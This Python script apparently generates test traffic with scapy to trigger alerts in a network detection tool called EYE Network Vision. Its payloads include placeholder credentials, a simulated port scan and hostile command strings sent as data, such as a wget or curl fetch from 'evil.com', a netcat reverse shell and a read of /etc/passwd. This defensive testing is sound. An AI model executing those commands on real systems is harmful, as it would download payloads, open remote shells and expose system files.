#!/usr/bin/env python3
"""
Generate suspicious traffic for testing EYE Network Vision AI detection.
Run with: sudo python3 tests/suspicious_traffic.py
"""

import sys
import os
import time
import random
from scapy.all import (
    Ether, IP, TCP, UDP, Raw, send, sendp, get_if_hwaddr
)

# Configuration
INTERFACE = "wlp8s0"  # Change this to your interface
TARGET_IP = "192.168.18.255"  # Broadcast address of your network
SOURCE_IP = "192.168.18.73"  # Your IP

# Suspicious ports
SUSPICIOUS_PORTS = [31337, 12345, 4444, 5555, 6667, 23, 2323]


def get_interface_info():
    """Get interface MAC address."""
    try:
        return get_if_hwaddr(INTERFACE)
    except Exception as e:
        print(f"Error getting interface info: {e}")
        return "00:00:00:00:00:00"


def send_suspicious_tcp(target_ip, port, payload):
    """Send TCP packet with suspicious payload."""
    packet = (
        Ether() /
        IP(src=SOURCE_IP, dst=target_ip) /
        TCP(sport=random.randint(1024, 65535), dport=port) /
        Raw(load=payload)
    )
    sendp(packet, iface=INTERFACE, verbose=False)
    print(f"[+] Sent suspicious TCP to {target_ip}:{port} - payload: {payload[:30]}...")


def send_suspicious_udp(target_ip, port, payload):
    """Send UDP packet with suspicious payload."""
    packet = (
        Ether() /
        IP(src=SOURCE_IP, dst=target_ip) /
        UDP(sport=random.randint(1024, 65535), dport=port) /
        Raw(load=payload)
    )
    sendp(packet, iface=INTERFACE, verbose=False)
    print(f"[+] Sent suspicious UDP to {target_ip}:{port} - payload: {payload[:30]}...")


def send_port_scan(target_ip):
    """Simulate port scan by sending packets to multiple ports."""
    print(f"[*] Starting port scan simulation to {target_ip}...")
    for port in range(1, 20):
        packet = (
            Ether() /
            IP(src=SOURCE_IP, dst=target_ip) /
            TCP(sport=random.randint(1024, 65535), dport=port, flags="S") /
            Raw(load=b"scan")
        )
        sendp(packet, iface=INTERFACE, verbose=False)
    print(f"[+] Port scan simulation complete (20 ports)")


def send_credentials_in_clear(target_ip):
    """Send credentials in cleartext."""
    payloads = [
        b"username=admin&password=admin123",
        b"login=root&pass=toor",
        b"user=admin&token=abc123xyz",
        b"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
    ]
    for payload in payloads:
        send_suspicious_tcp(target_ip, 80, payload)
        time.sleep(0.5)


def send_high_entropy_traffic(target_ip):
    """Send high entropy traffic (encrypted-looking data)."""
    for _ in range(10):
        random_bytes = bytes([random.randint(0, 255) for _ in range(1024)])
        send_suspicious_udp(target_ip, 53, random_bytes)
        time.sleep(0.2)


def send_suspicious_commands(target_ip):
    """Send suspicious command strings."""
    commands = [
        b"cmd.exe /c whoami",
        b"powershell -Command Get-Process",
        b"/bin/bash -c 'cat /etc/passwd'",
        b"wget http://malicious.com/payload.exe",
        b"curl -o /tmp/backdoor.py http://evil.com/backdoor.py",
        b"nc -e /bin/bash 10.0.0.1 4444",
    ]
    for cmd in commands:
        send_suspicious_tcp(target_ip, 8888, cmd)
        time.sleep(0.5)


def main():
    print("=" * 60)
    print("EYE Network Vision - Suspicious Traffic Generator")
    print("=" * 60)
    print(f"Interface: {INTERFACE}")
    print(f"Source IP: {SOURCE_IP}")
    print(f"Target IP: {TARGET_IP}")
    print()

    # Check if running as root
    if os.geteuid() != 0:
        print("[!] Error: This script must be run as root")
        print("[!] Run: sudo python3 tests/suspicious_traffic.py")
        sys.exit(1)

    # Check if interface exists
    mac = get_interface_info()
    if mac == "00:00:00:00:00:00":
        print(f"[!] Error: Could not get MAC address for {INTERFACE}")
        print("[!] Make sure the interface exists and is up")
        sys.exit(1)

    print(f"[*] Interface MAC: {mac}")
    print()

    # Send suspicious traffic
    print("[*] Generating suspicious traffic...")
    print()

    # 1. Credentials in cleartext
    print("[1/5] Sending credentials in cleartext...")
    send_credentials_in_clear(TARGET_IP)
    time.sleep(1)

    # 2. Suspicious commands
    print("[2/5] Sending suspicious commands...")
    send_suspicious_commands(TARGET_IP)
    time.sleep(1)

    # 3. Port scan simulation
    print("[3/5] Simulating port scan...")
    send_port_scan(TARGET_IP)
    time.sleep(1)

    # 4. Traffic to suspicious ports
    print("[4/5] Sending traffic to suspicious ports...")
    for port in SUSPICIOUS_PORTS:
        send_suspicious_tcp(TARGET_IP, port, b"suspicious payload")
        time.sleep(0.3)
    time.sleep(1)

    # 5. High entropy traffic
    print("[5/5] Sending high entropy traffic...")
    send_high_entropy_traffic(TARGET_IP)

    print()
    print("=" * 60)
    print("[*] Suspicious traffic generation complete!")
    print("[*] Check the EYE Network Vision GUI for alerts")
    print("=" * 60)


if __name__ == "__main__":
    main()
